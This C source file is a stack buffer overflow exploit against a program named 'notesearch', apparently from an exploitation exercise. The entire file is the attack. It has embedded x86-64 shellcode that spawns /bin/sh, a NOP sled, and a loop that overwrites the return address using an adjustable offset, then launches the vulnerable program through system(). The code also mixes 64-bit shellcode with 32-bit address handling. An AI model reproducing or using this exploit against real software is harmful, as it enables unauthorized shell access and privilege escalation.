#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69"
"\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";


int main(int argc, char *argv[]) {
    unsigned int i, *ptr, ret, offset=270;
    char *command, *buffer;

    command = (char *) malloc(200);
    bzero(command, 200);

    strcpy(command, "./notesearch \'");
    buffer = command + strlen(command);
    
    if(argc > 1)
        offset = atoi(argv[1]);
    
    ret = (unsigned int) &i - offset;
    
    for(i=0; i < 160; i+=4)
        *((unsigned int *)(buffer + i)) = ret;
    memset(buffer, 0x90, 60); // Build NOP sled.
    memcpy(buffer+60, shellcode, sizeof(shellcode) - 1);
    
    strcat(command, "\'");
    system(command);
    free(command);

}
